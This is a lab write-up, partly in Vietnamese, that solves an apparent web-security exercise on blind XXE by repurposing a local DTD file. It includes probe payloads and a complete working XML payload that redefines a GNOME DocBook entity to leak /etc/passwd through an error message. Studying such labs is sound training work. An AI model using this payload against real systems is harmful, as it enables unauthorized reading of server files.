# Target Goal
This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, trigger an error message containing the contents of the `/etc/passwd` file.

You'll need to reference an existing DTD file on the server and redefine an entity from it.
# Analysis
Đối với mục tiêu của bài lab, ta sẽ tấn công vào tính năng `Check stock`

![image](https://github.com/user-attachments/assets/1b1b7358-26f1-40a6-b84e-65143b5610b0)

Sử dụng Burp để xem nội dung gói tin 

![image](https://github.com/user-attachments/assets/abf64c2f-f720-46a8-974d-628cbc2df1a6)

Vì cuộc tấn công **XXE** này liên quan đến việc tái sử dụng một DTD hiện có trên hệ thống tệp máy chủ, nên yêu cầu chính là xác định vị trí tệp phù hợp. Khi kiểm tra local DTD sai, nó trả về lỗi:
```
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///WindowsSystem32/wbem/xml/cim20.dtd">
%local_dtd;
]>
```

![image](https://github.com/user-attachments/assets/e1148ad4-d7e7-480c-856e-d98ce4376676)

Khi kiểm tra local DTD đúng, nó sẽ không trả về lỗi
```
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
![image](https://github.com/user-attachments/assets/304a0f53-5a57-4420-9937-46fe36c4731a)

Dựa vào hint bài lab cho để đỡ mất thời gian search :)) ta có enity `ISOamso` ở trong **GNOME desktop**. Ta sẽ dựng được payload sau

![image](https://github.com/user-attachments/assets/dafe380a-fe3b-4baf-8fdd-f991897a9ed5)
```
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
Sau khi gửi payload, chúng ta nhận được thông báo lỗi chứa nội dung tệp /etc/passwd, bài lab hoàn thành:

![image](https://github.com/user-attachments/assets/f64126d3-11a7-4ba2-ae2c-e7256b4ef3e8)

# Flag
![image](https://github.com/user-attachments/assets/553be9c7-5e67-4c31-9f85-df0f533942ed)


